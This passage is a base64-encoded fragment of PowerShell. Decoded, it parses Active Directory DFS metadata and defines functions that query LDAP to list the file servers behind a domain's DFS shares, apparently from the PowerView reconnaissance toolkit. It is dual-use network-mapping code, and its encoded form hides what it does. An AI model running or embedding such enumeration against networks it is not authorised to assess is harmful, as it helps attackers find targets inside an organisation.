bG9iX2RhdGFbJHByZWZpeF9zaXplX3N0YXJ0Li4kcHJlZml4X3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4X3N0YXJ0ID0gJHByZWZpeF9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF9lbmQgPSAkcHJlZml4X3N0YXJ0ICsgJHByZWZpeF9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJsb2JfZGF0YVskcHJlZml4X3N0YXJ0Li4kcHJlZml4X2VuZF0pCgogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4X3NpemVfc3RhcnQgPSAkcHJlZml4X2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeF9zaXplX2VuZCA9ICRzaG9ydF9wcmVmaXhfc2l6ZV9zdGFydCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeF9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRibG9iX2RhdGFbJHNob3J0X3ByZWZpeF9zaXplX3N0YXJ0Li4kc2hvcnRfcHJlZml4X3NpemVfZW5kXSwwKQogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4X3N0YXJ0ID0gJHNob3J0X3ByZWZpeF9zaXplX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHNob3J0X3ByZWZpeF9lbmQgPSAkc2hvcnRfcHJlZml4X3N0YXJ0ICsgJHNob3J0X3ByZWZpeF9zaXplIC0gMQogICAgICAgICAgICAgICAgICAgICAgICAkc2hvcnRfcHJlZml4ID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGJsb2JfZGF0YVskc2hvcnRfcHJlZml4X3N0YXJ0Li4kc2hvcnRfcHJlZml4X2VuZF0pCgogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZV9zdGFydCA9ICRzaG9ydF9wcmVmaXhfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkdHlwZV9lbmQgPSAkdHlwZV9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHR5cGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskdHlwZV9zdGFydC4uJHR5cGVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX3N0YXJ0ID0gJHR5cGVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGVfZW5kID0gJHN0YXRlX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskc3RhdGVfc3RhcnQuLiRzdGF0ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF9zaXplX3N0YXJ0ID0gJHN0YXRlX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfc2l6ZV9lbmQgPSAkY29tbWVudF9zaXplX3N0YXJ0ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudF9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDE2KCRibG9iX2RhdGFbJGNvbW1lbnRfc2l6ZV9zdGFydC4uJGNvbW1lbnRfc2l6ZV9lbmRdLDApCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3N0YXJ0ID0gJGNvbW1lbnRfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X2VuZCA9ICRjb21tZW50X3N0YXJ0ICsgJGNvbW1lbnRfc2l6ZSAtIDEKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRjb21tZW50X3NpemUgLWd0IDApICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkY29tbWVudCA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRibG9iX2RhdGFbJGNvbW1lbnRfc3RhcnQuLiRjb21tZW50X2VuZF0pCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJHByZWZpeF90aW1lc3RhbXBfc3RhcnQgPSAkY29tbWVudF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRwcmVmaXhfdGltZXN0YW1wX2VuZCA9ICRwcmVmaXhfdGltZXN0YW1wX3N0YXJ0ICsgNwogICAgICAgICAgICAgICAgICAgICAgICAjIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvY2MyMzAzMjQuYXNweCBGSUxFVElNRQogICAgICAgICAgICAgICAgICAgICAgICAkcHJlZml4X3RpbWVzdGFtcCA9ICRibG9iX2RhdGFbJHByZWZpeF90aW1lc3RhbXBfc3RhcnQuLiRwcmVmaXhfdGltZXN0YW1wX2VuZF0gI2R3b3JkIGxvd0RhdGVUaW1lICNkd29yZCBoaWdoZGF0ZXRpbWUKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX3RpbWVzdGFtcF9zdGFydCA9ICRwcmVmaXhfdGltZXN0YW1wX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHN0YXRlX3RpbWVzdGFtcF9lbmQgPSAkc3RhdGVfdGltZXN0YW1wX3N0YXJ0ICsgNwogICAgICAgICAgICAgICAgICAgICAgICAkc3RhdGVfdGltZXN0YW1wID0gJGJsb2JfZGF0YVskc3RhdGVfdGltZXN0YW1wX3N0YXJ0Li4kc3RhdGVfdGltZXN0YW1wX2VuZF0KICAgICAgICAgICAgICAgICAgICAgICAgJGNvbW1lbnRfdGltZXN0YW1wX3N0YXJ0ID0gJHN0YXRlX3RpbWVzdGFtcF9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3RpbWVzdGFtcF9lbmQgPSAkY29tbWVudF90aW1lc3RhbXBfc3RhcnQgKyA3CiAgICAgICAgICAgICAgICAgICAgICAgICRjb21tZW50X3RpbWVzdGFtcCA9ICRibG9iX2RhdGFbJGNvbW1lbnRfdGltZXN0YW1wX3N0YXJ0Li4kY29tbWVudF90aW1lc3RhbXBfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkdmVyc2lvbl9zdGFydCA9ICRjb21tZW50X3RpbWVzdGFtcF9lbmQgICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkdmVyc2lvbl9lbmQgPSAkdmVyc2lvbl9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHZlcnNpb24gPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskdmVyc2lvbl9zdGFydC4uJHZlcnNpb25fZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgIyBQYXJzZSByZXN0IG9mIERGU05hbWVzcGFjZVJvb3RPckxpbmtCbG9iIGhlcmUKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9zdGFydCA9ICR2ZXJzaW9uX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9lbmQgPSAkZGZzX3RhcmdldGxpc3RfYmxvYl9zaXplX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYl9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRibG9iX2RhdGFbJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9zdGFydC4uJGRmc190YXJnZXRsaXN0X2Jsb2Jfc2l6ZV9lbmRdLDApCgogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydCA9ICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkZGZzX3RhcmdldGxpc3RfYmxvYl9lbmQgPSAkZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydCArICRkZnNfdGFyZ2V0bGlzdF9ibG9iX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICRkZnNfdGFyZ2V0bGlzdF9ibG9iID0gJGJsb2JfZGF0YVskZGZzX3RhcmdldGxpc3RfYmxvYl9zdGFydC4uJGRmc190YXJnZXRsaXN0X2Jsb2JfZW5kXQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zaXplX3N0YXJ0ID0gJGRmc190YXJnZXRsaXN0X2Jsb2JfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzZXJ2ZWRfYmxvYl9zaXplX2VuZCA9ICRyZXNlcnZlZF9ibG9iX3NpemVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNlcnZlZF9ibG9iX3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGJsb2JfZGF0YVskcmVzZXJ2ZWRfYmxvYl9zaXplX3N0YXJ0Li4kcmVzZXJ2ZWRfYmxvYl9zaXplX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNlcnZlZF9ibG9iX3N0YXJ0ID0gJHJlc2VydmVkX2Jsb2Jfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNlcnZlZF9ibG9iX2VuZCA9ICRyZXNlcnZlZF9ibG9iX3N0YXJ0ICsgJHJlc2VydmVkX2Jsb2Jfc2l6ZSAtIDEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc2VydmVkX2Jsb2IgPSAkYmxvYl9kYXRhWyRyZXNlcnZlZF9ibG9iX3N0YXJ0Li4kcmVzZXJ2ZWRfYmxvYl9lbmRdCiAgICAgICAgICAgICAgICAgICAgICAgICRyZWZlcnJhbF90dGxfc3RhcnQgPSAkcmVzZXJ2ZWRfYmxvYl9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICRyZWZlcnJhbF90dGxfZW5kID0gJHJlZmVycmFsX3R0bF9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHJlZmVycmFsX3R0bCA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkYmxvYl9kYXRhWyRyZWZlcnJhbF90dGxfc3RhcnQuLiRyZWZlcnJhbF90dGxfZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgI1BhcnNlIERGU1RhcmdldExpc3RCbG9iCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfY291bnRfc3RhcnQgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfY291bnRfZW5kID0gJHRhcmdldF9jb3VudF9zdGFydCArIDMKICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9jb3VudCA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X2NvdW50X3N0YXJ0Li4kdGFyZ2V0X2NvdW50X2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgJHRfb2Zmc2V0ID0gJHRhcmdldF9jb3VudF9lbmQgKyAxCgogICAgICAgICAgICAgICAgICAgICAgICBmb3IoJGo9MTsgJGogLWxlICR0YXJnZXRfY291bnQ7ICRqKyspewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9lbnRyeV9zaXplX3N0YXJ0ID0gJHRfb2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X2VudHJ5X3NpemVfZW5kID0gJHRhcmdldF9lbnRyeV9zaXplX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9lbnRyeV9zaXplID0gW2JpdGNvbnZlcnRlcl06OlRvVUludDMyKCRkZnNfdGFyZ2V0bGlzdF9ibG9iWyR0YXJnZXRfZW50cnlfc2l6ZV9zdGFydC4uJHRhcmdldF9lbnRyeV9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfdGltZV9zdGFtcF9zdGFydCA9ICR0YXJnZXRfZW50cnlfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3RpbWVfc3RhbXBfZW5kID0gJHRhcmdldF90aW1lX3N0YW1wX3N0YXJ0ICsgNwogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBGSUxFVElNRSBhZ2FpbiBvciBzcGVjaWFsIGlmIHByaW9yaXR5IHJhbmsgYW5kIHByaW9yaXR5IGNsYXNzIDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfdGltZV9zdGFtcCA9ICRkZnNfdGFyZ2V0bGlzdF9ibG9iWyR0YXJnZXRfdGltZV9zdGFtcF9zdGFydC4uJHRhcmdldF90aW1lX3N0YW1wX2VuZF0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfc3RhdGVfc3RhcnQgPSAkdGFyZ2V0X3RpbWVfc3RhbXBfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9zdGF0ZV9lbmQgPSAkdGFyZ2V0X3N0YXRlX3N0YXJ0ICsgMwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRhcmdldF9zdGF0ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQzMigkZGZzX3RhcmdldGxpc3RfYmxvYlskdGFyZ2V0X3N0YXRlX3N0YXJ0Li4kdGFyZ2V0X3N0YXRlX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3R5cGVfc3RhcnQgPSAkdGFyZ2V0X3N0YXRlX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfdHlwZV9lbmQgPSAkdGFyZ2V0X3R5cGVfc3RhcnQgKyAzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGFyZ2V0X3R5cGUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MzIoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHRhcmdldF90eXBlX3N0YXJ0Li4kdGFyZ2V0X3R5cGVfZW5kXSwwKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2ZXJfbmFtZV9zaXplX3N0YXJ0ID0gJHRhcmdldF90eXBlX2VuZCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2ZXJfbmFtZV9zaXplX2VuZCA9ICRzZXJ2ZXJfbmFtZV9zaXplX3N0YXJ0ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNlcnZlcl9uYW1lX3NpemUgPSBbYml0Y29udmVydGVyXTo6VG9VSW50MTYoJGRmc190YXJnZXRsaXN0X2Jsb2JbJHNlcnZlcl9uYW1lX3NpemVfc3RhcnQuLiRzZXJ2ZXJfbmFtZV9zaXplX2VuZF0sMCkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWVfc3RhcnQgPSAkc2VydmVyX25hbWVfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWVfZW5kID0gJHNlcnZlcl9uYW1lX3N0YXJ0ICsgJHNlcnZlcl9uYW1lX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2VydmVyX25hbWUgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZygkZGZzX3RhcmdldGxpc3RfYmxvYlskc2VydmVyX25hbWVfc3RhcnQuLiRzZXJ2ZXJfbmFtZV9lbmRdKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3NpemVfc3RhcnQgPSAkc2VydmVyX25hbWVfZW5kICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWVfc2l6ZV9lbmQgPSAkc2hhcmVfbmFtZV9zaXplX3N0YXJ0ICsgMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJHNoYXJlX25hbWVfc2l6ZSA9IFtiaXRjb252ZXJ0ZXJdOjpUb1VJbnQxNigkZGZzX3RhcmdldGxpc3RfYmxvYlskc2hhcmVfbmFtZV9zaXplX3N0YXJ0Li4kc2hhcmVfbmFtZV9zaXplX2VuZF0sMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRzaGFyZV9uYW1lX3N0YXJ0ID0gJHNoYXJlX25hbWVfc2l6ZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZV9lbmQgPSAkc2hhcmVfbmFtZV9zdGFydCArICRzaGFyZV9uYW1lX3NpemUgLSAxCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc2hhcmVfbmFtZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKCRkZnNfdGFyZ2V0bGlzdF9ibG9iWyRzaGFyZV9uYW1lX3N0YXJ0Li4kc2hhcmVfbmFtZV9lbmRdKQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfbGlzdCArPSAiXFwkc2VydmVyX25hbWVcJHNoYXJlX25hbWUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdF9vZmZzZXQgPSAkc2hhcmVfbmFtZV9lbmQgKyAxCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkb2Zmc2V0ID0gJGJsb2JfZGF0YV9lbmQgKyAxCiAgICAgICAgICAgICAgICAkZGZzX3BrdF9wcm9wZXJ0aWVzID0gQHsKICAgICAgICAgICAgICAgICAgICAnTmFtZScgPSAkYmxvYl9uYW1lCiAgICAgICAgICAgICAgICAgICAgJ1ByZWZpeCcgPSAkcHJlZml4CiAgICAgICAgICAgICAgICAgICAgJ1RhcmdldExpc3QnID0gJHRhcmdldF9saXN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkb2JqZWN0X2xpc3QgKz0gTmV3LU9iamVjdCAtVHlwZU5hbWUgUFNPYmplY3QgLVByb3BlcnR5ICRkZnNfcGt0X3Byb3BlcnRpZXMKICAgICAgICAgICAgICAgICRwcmVmaXggPSAkTnVsbAogICAgICAgICAgICAgICAgJGJsb2JfbmFtZSA9ICROdWxsCiAgICAgICAgICAgICAgICAkdGFyZ2V0X2xpc3QgPSAkTnVsbAogICAgICAgICAgICB9CgogICAgICAgICAgICAkc2VydmVycyA9IEAoKQogICAgICAgICAgICAkb2JqZWN0X2xpc3QgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICBpZiAoJF8uVGFyZ2V0TGlzdCkgewogICAgICAgICAgICAgICAgICAgICRfLlRhcmdldExpc3QgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRzZXJ2ZXJzICs9ICRfLnNwbGl0KCdcJylbMl0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRzZXJ2ZXJzCiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBHZXQtRG9tYWluREZTU2hhcmVWMSB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICREb21haW4sCgogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VydmVyLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgICAgICAgICBbU3dpdGNoXQogICAgICAgICAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICAgICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRERlNzZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAUFNCb3VuZFBhcmFtZXRlcnMKCiAgICAgICAgICAgIGlmICgkREZTc2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgICRERlNzZWFyY2hlci5maWx0ZXIgPSAnKCYob2JqZWN0Q2xhc3M9ZlREZnMpKScKCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICRSZXN1bHRzID0gJERGU1NlYXJjaGVyLkZpbmRBbGwoKQogICAgICAgICAgICAgICAgICAgICRSZXN1bHRzIHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9wZXJ0aWVzID0gJF8uUHJvcGVydGllcwogICAgICAgICAgICAgICAgICAgICAgICAkUmVtb3RlTmFtZXMgPSAkUHJvcGVydGllcy5yZW1vdGVzZXJ2ZXJuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICRQa3QgPSAkUHJvcGVydGllcy5wa3QKCiAgICAgICAgICAgICAgICAgICAgICAgICRERlNzaGFyZXMgKz0gJFJlbW90ZU5hbWVzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoICRfLkNvbnRhaW5zKCdcJykgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0kUHJvcGVydGllcy5uYW1lWzBdOydSZW1vdGVTZXJ2ZXJOYW1lJz0kXy5zcGxpdCgnXCcpWzJdfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBpbiBwYXJzaW5nIERGUyBzaGFyZSA6ICRfIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0cykgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgeyAkUmVzdWx0cy5kaXNwb3NlKCkgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkREZTU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgICAgICAgICAgICAgIGlmICgkcGt0IC1hbmQgJHBrdFswXSkgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJzZS1Qa3QgJHBrdFswXSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgSWYgYSBmb2xkZXIgZG9lc24ndCBoYXZlIGEgcmVkaXJlY3Rpb24gaXQgd2lsbCBoYXZlIGEgdGFyZ2V0IGxpa2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgXFxudWxsXFRlc3ROYW1lU3BhY2VcZm9sZGVyXC5ERlNGb2xkZXJMaW5rIHNvIHdlIGRvIGFjdHVhbGx5IHdhbnQgdG8gbWF0Y2gKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgb24gJ251bGwnIHJhdGhlciB0aGFuICROdWxsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJF8gLW5lICdudWxsJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSBAeydOYW1lJz0kUHJvcGVydGllcy5uYW1lWzBdOydSZW1vdGVTZXJ2ZXJOYW1lJz0kX30KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LURvbWFpbkRGU1NoYXJlXSBHZXQtRG9tYWluREZTU2hhcmVWMSBlcnJvciA6ICRfIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJERGU3NoYXJlcyB8IFNvcnQtT2JqZWN0IC1VbmlxdWUgLVByb3BlcnR5ICdSZW1vdGVTZXJ2ZXJOYW1lJwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBHZXQtRG9tYWluREZTU2hhcmVWMiB7CiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICREb21haW4sCgogICAgICAgICAgICAgICAgW1N0cmluZ10KICAgICAgICAgICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VydmVyLAoKICAgICAgICAgICAgICAgIFtTdHJpbmddCiAgICAgICAgICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgICAgICAgICAgW0ludF0KICAgICAgICAgICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgICAgICAgICBbSW50XQogICAgICAgICAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgICAgICAgICBbU3dpdGNoXQogICAgICAgICAgICAgICAgJFRvbWJzdG9uZSwKCiAgICAgICAgICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICAgICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICAgICAgICAgICkKCiAgICAgICAgICAgICRERlNzZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAUFNCb3VuZFBhcmFtZXRlcnMKCiAgICAgICAgICAgIGlmICgkREZTc2VhcmNoZXIpIHsKICAgICAgICAgICAgICAgICRERlNzaGFyZXMgPSBAKCkKICAgICAgICAgICAgICAgICRERlNzZWFyY2hlci5maWx0ZXIgPSAnKCYob2JqZWN0Q2xhc3M9bXNERlMtTGlua3YyKSknCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRERlNTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgnbXNkZnMtbGlua3BhdGh2MicsJ21zREZTLVRhcmdldExpc3R2MicpKQoKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdHMgPSAkREZTU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb3BlcnRpZXMgPSAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgICR0YXJnZXRfbGlzdCA9ICRQcm9wZXJ0aWVzLidtc2Rmcy10YXJnZXRsaXN0djInWzBdCiAgICAgICAgICAgICAgICAgICAgICAgICR4bWwgPSBbeG1sXVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR